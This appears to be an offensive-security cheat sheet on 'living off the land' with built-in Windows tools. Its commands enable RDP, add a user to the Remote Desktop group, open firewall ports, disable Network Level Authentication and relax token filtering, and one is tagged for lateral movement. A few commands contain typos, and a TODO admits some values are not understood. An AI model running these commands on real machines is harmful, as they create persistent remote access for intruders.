# Living off the Land

## 01 - Enable RDP Server

```
C:\> sc.exe config termservice start=auto
```

To start Remote Desktop Service

```
C:\> net.exe start termservice
```

To stop Remote Desktop Service

```
C:\> net.exe stop termservice
```

## 02 - Enable with Registry

### 2.1 - Choose any of the three options

#### 2.1.1 - Automatic

```
C:\> reg.exe add hklm\system\currentcontrolset\services\termservice /v Start /t REG_DWORD /d 2 /f

PS C:\> Set-ItemProperty -Force -Path "HKLM:\System\CurrentControlSet\Services\Termservice" -Name "Start" -Type DWord -Value 2
```

#### 2.1.2 - Manual

```
C:\> reg.exe add hklm\system\currentcontrolset\services\termservice /v Start /t REG_DWORD /d 3 /f

PS C:\> Set-ItemProperty -Force -Path "HKLM:\System\CurrentControlSet\Services\Termservice" -Name "Start" -Type DWord -Value 3
```

#### 2.1.3 - Disabled

```
C:\> reg.exe add hklm\system\currentcontrolset\services\termservice /v Start /t REG_DWORD /d 4 /f

PS C:\> Set-ItemProperty -Force -Path "HKLM:\System\CurrentControlSet\Services\Termservice" -Name "Start" -Type DWord -Value 4
```

### 2.2 - Create user and add it to the RDP users group

^1f2bd0

```
C:\> net.exe user <username> <password> /add & net localgroup "Remote Desktop Users" <username> /add

PS C:\> Add-LocalGroupMember -Group "Remote Desktop Users" -Member <username>
```

### 2.3 - Ports for the RDP port

#### 2.3.1 - Command Prompt

```
C:\> reg.exe add "[\\<IP>\]HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber" /t REG_DWORD /d <PORT> /f

C:\> reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 3389:TCP /t REG_SZ /d "3389:TCP:*:Enabled:Remote Desktop" /f

C:\> reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

C:\> reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

C:\> reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f

C:\> reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Licensing Core" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f
```

#### 2.3.2 - Powershell

```
PS C:\> Set-ItemProperty -Force -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "PortNumber" -Type DWord -Value <PORT>

PS C:\> Set-ItemProperty -Force -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Type DWord -Value 0
```

### 2.4 - Set a firewall rule

#### 2.4.1 - Command Prompt

```
C:\> netsh.exe firewall set service type=remotedesktop mode=enabled

C:\> netsh.exe advfirewall firewall set rule group="remote desktop" new enable=yes
```

#### 2.4.2 - Powershell

```
PS C:\> Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

PS C:\> New-NetFirewallRule -DisplayName 'RDPPORTLatest' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 21390
```

### 2.5 - Disable Admin Restriction

#### 2.5.1 - Command Prompt

```
C:\> reg.exe add "HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestricedAdmin /t REG_DWORD /d 0 /f
```

#### 2.5.2 - PowerShell

```
PS C:\> Set-ItemProperty -Force -Path 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name "DisableRestricedAdmin" -Type DWord -Value 0
```

### 2.6 - Login RDP

Useful for lateral movement

```
C:\> mstsc.exe /v:<IP> [/restrictedadmin]
```

TODO: Figure it out what each of these registry values and subkey does.

```
C:\> reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f

C:\> reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AllowMultipleTSSessions /t REG_DWORD /d 1 /f

C:\> reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MaxInstanceCount /t REG_DWORD /d 100 /f

C:\> reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\SYSTEM" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

```
PS C:\> Set-ItemProperty -Force -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "EnableConcurrentSessions" -Type DWord -Value 1

PS C:\> Set-ItemProperty -Force -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "AllowMultipleTSSessions" -Type DWord -Value 1

PS C:\> Set-ItemProperty -Force -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services' -Name "MaxInstanceCount" -Type DWord -Value 100

PS C:\> Set-ItemProperty -Force -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\SYSTEM' -Name "LocalAccountTokenFilterPolicy" -Type DWord -Value 1
```

---
## References

- [LOFLCAB: reg](https://lofl-project.github.io/loflcab/Binaries/reg/)

- [TakeMyRDP2.0](https://github.com/nocerainfosec/TakeMyRDP2.0)

- [FAS Data Security Compliance Program: Russian Government Cyber Activity Targeting Energy and Other Critical Infrastructure Sectors](https://datasecurity.ucsf.edu/news/russian-government-cyber-activity-targeting-energy-and-other-critical-infrastructure-sectors)